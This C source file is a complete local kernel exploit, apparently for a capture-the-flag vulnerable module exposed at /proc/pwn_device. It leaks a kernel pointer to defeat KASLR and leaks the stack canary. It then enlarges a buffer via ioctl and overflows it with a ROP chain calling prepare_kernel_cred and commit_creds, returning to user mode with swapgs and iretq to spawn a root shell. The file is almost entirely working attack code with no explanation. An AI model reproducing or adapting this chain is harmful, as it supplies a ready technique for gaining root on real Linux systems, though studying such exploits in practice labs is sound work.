#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>

#define DEVICE_PATH "/proc/pwn_device"
#define SET_MAXBUFFER_IOCTL 0x20

unsigned long SS;
unsigned long RSP;
unsigned long RFLAGS;
unsigned long CS;

int device_fd = 0;

void get_shell(void) {
    puts("Will obtain the root shell...");
    system("/bin/sh");
    exit(0);
}

unsigned long defeat_kaslr(void) {
    unsigned long buffer[19];

    memset(buffer, 0, sizeof(buffer));
    read(device_fd, buffer, sizeof(buffer));

    return buffer[18] - 2351943;
}

unsigned long defeat_stack_cookie(void) {
    unsigned long buffer[0x11];

    memset(buffer, 0, sizeof(buffer));
    read(device_fd, buffer, sizeof(buffer));

    return buffer[0x10];
}

int main(void) {
    __asm__(
        "mov %%rsp, %0\n"
        "mov %%ss, %1\n"
        "mov %%cs, %2\n"
        "pushf\n"
        "pop %3\n"
        : "=r"(RSP), "=r"(SS), "=r"(CS), "=r"(RFLAGS)
    );
    printf("Context:\n\tSS  : 0x%lx\n\tCS  : 0x%lx\n\tRSP : 0x%lx\n\tFL  : 0x%lx\n", SS, CS, RSP, RFLAGS);

    unsigned long kernel_base  = 0;
    unsigned long stack_cookie = 0;
    unsigned long rop[] = {
        0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, // PADDING
        0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, // PADDING
        0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, // PADDING
        0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, // PADDING
        0xbbbbbbbbbbbbbbbb,       // Stack cookie
        0xaaaaaaaaaaaaaaaa,       // Pushed RBX
        0x1518,                   // pop rdi ; ret
        0x0000000000000000,       // RDI = 0
        0x881c0,                  // prepare_kernel_cred
        0x32440f,                 // pop rdx ; push rax ; pop rbx ; ret
        0xaaaaaaaaaaaaaaaa,       // Fake RDX
        0x200680,                 // mov rdi, rbx ; mov rax, rdi ; pop rbx ; pop rbp ; ret
        0xaaaaaaaaaaaaaaaa,       // Fake RBX
        0xaaaaaaaaaaaaaaaa,       // Fake RBP
        0x87e80,                  // commit_creds
        0xc00eaa,                 // swapgs ; popfq ; ret
        0x0000000000000000,       // Fake EFLAGS
        0x23cc2,                  // iretq
        (unsigned long)get_shell,
        CS,
        RFLAGS,
        RSP,
        SS
    };

    device_fd = open(DEVICE_PATH, O_RDWR);

    printf("Defeating KASLR...\n");
    kernel_base = defeat_kaslr();
    printf("Kernel base: %lx\n", kernel_base);

    printf("Defeating stack cookie...\n");
    stack_cookie = defeat_stack_cookie();
    printf("Stack cookie: %lx\n", stack_cookie);

    for(int i=0; i<18; i++) {
        rop[i]  = stack_cookie;
    }
    rop[18] += kernel_base;
    rop[20] += kernel_base;
    rop[21] += kernel_base;
    rop[23] += kernel_base;
    rop[26] += kernel_base;
    rop[27] += kernel_base;
    rop[29] += kernel_base;

    printf("Setting long long MaxBuffer size...\n");
    ioctl(device_fd, SET_MAXBUFFER_IOCTL, 0x1000);

    printf("Setting SEGFAULT handler...\n");
    signal(SIGSEGV, (__sighandler_t)get_shell);

    printf("Exploiting...\n");
    write(device_fd, rop, sizeof(rop));

    return 0;
}